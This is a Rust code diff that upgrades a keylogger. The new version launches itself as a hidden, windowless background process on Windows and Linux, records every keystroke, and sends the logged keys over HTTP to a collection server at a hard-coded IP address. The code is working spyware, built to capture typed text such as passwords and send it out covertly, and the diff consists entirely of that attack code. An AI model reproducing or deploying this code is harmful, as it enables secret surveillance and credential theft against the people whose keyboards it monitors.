@@ -1,60 +1,96 @@
 use device_query::{DeviceQuery, DeviceState, Keycode};
-use std::fs::OpenOptions;
-use std::io::Write;
 
-pub fn keylogger() {
-    // Open or create the log file
-    let mut file = OpenOptions::new()
-        .create(true)
-        .append(true)
-        .open("keylog.txt")
-        .expect("Failed to open log file");
+#[cfg(target_os = "windows")]
+use std::os::windows::process::CommandExt; // Required for `creation_flags`
 
-    println!("Keylogger started. Press 'ESC' to exit.");
+use std::process::{Command, Stdio};
+use std::time::Duration;
 
+pub fn deploy_keylogger_detached() -> Result<(), Box<dyn std::error::Error>> {
+    println!("Deploying keylogger...");
+
+    let exe_path = std::env::current_exe()?;
+
+    #[cfg(target_os = "windows")]
+    {
+        // Windows-specific detached process handling
+        Command::new(exe_path)
+            .arg("--background-keylogger")
+            .stdin(Stdio::null())
+            .stdout(Stdio::null())
+            .stderr(Stdio::null())
+            .creation_flags(0x08000000) // CREATE_NO_WINDOW
+            .spawn()?;
+    }
+
+    #[cfg(target_os = "linux")]
+    {
+        // Linux-specific detached process handling
+        Command::new(exe_path)
+            .arg("--background-keylogger")
+            .stdin(Stdio::null())
+            .stdout(Stdio::null())
+            .stderr(Stdio::null())
+            .spawn()?;
+    }
+
+    println!("Keylogger is running in the background.");
+    Ok(())
+}
+
+pub fn handle_background_keylogger() {
+    let device_state = DeviceState::new();
     let mut last_keys = vec![];
 
-    let device_state = DeviceState::new();
+    println!("Keylogger is active. Logs will be sent directly to the server.");
 
     loop {
-        // Get the list of currently pressed keys
         let keys = device_state.get_keys();
 
-        // Detect and log newly pressed keys
-        for key in keys.iter() {
-            if !last_keys.contains(key) {
-                let key_string = match key {
-                    Keycode::Enter => "\n".to_string(),   // Enter key
-                    Keycode::Space => " ".to_string(),    // Space key
-                    Keycode::Tab => "[Tab]".to_string(),  // Tab key
-                    Keycode::LShift | Keycode::RShift => "[Shift]".to_string(), // Shift keys
-                    Keycode::Escape => "[ESC]".to_string(), // ESC key
-                    _ => format!("{:?}", key), // Any other key
-                };
-
-                // Write the detected key to the log file
-                if let Err(e) = writeln!(file, "{}", key_string) {
-                    eprintln!("Failed to write to log file: {}", e);
-                }
-
-                // Flush the file to ensure data is saved
-                if let Err(e) = file.flush() {
-                    eprintln!("Failed to flush log file: {}", e);
-                }
-
-                // Print the key for debugging
-                println!("Key Pressed: {}", key_string);
+        // Stop the keylogger with Alt+S
+        if keys.contains(&Keycode::LAlt) || keys.contains(&Keycode::RAlt) {
+            if keys.contains(&Keycode::S) {
+                println!("Keylogger stopped by Alt+S.");
+                return;
             }
         }
 
-        // Check if ESC key is pressed to exit
-        if keys.contains(&Keycode::Escape) {
-            break;
+        let mut key_log = String::new();
+
+        for key in keys.iter() {
+            if !last_keys.contains(key) {
+                let key_string = match key {
+                    Keycode::Enter => "\n".to_string(),
+                    Keycode::Space => " ".to_string(),
+                    Keycode::Tab => "[Tab]".to_string(),
+                    Keycode::LShift | Keycode::RShift => "[Shift]".to_string(),
+                    Keycode::Backspace => "[Backspace]".to_string(),
+                    Keycode::Escape => "[ESC]".to_string(),
+                    _ => format!("{:?}", key),
+                };
+
+                key_log.push_str(&key_string);
+            }
         }
 
-        // Update the last keys pressed
+        if !key_log.is_empty() {
+            if let Err(e) = send_logs_to_server(&key_log) {
+                eprintln!("Failed to send logs to server: {}", e);
+            }
+        }
+
         last_keys = keys;
+        std::thread::sleep(Duration::from_millis(50));
+    }
+}
+
+fn send_logs_to_server(key_log: &str) -> Result<(), Box<dyn std::error::Error>> {
+    let response = ureq::post("http://192.168.153.129:5000/upload")
+        .send_string(key_log);
+
+    if let Err(e) = response {
+        eprintln!("Failed to send logs: {}", e);
     }
 
-    println!("Keylogger stopped.");
+    Ok(())
 }
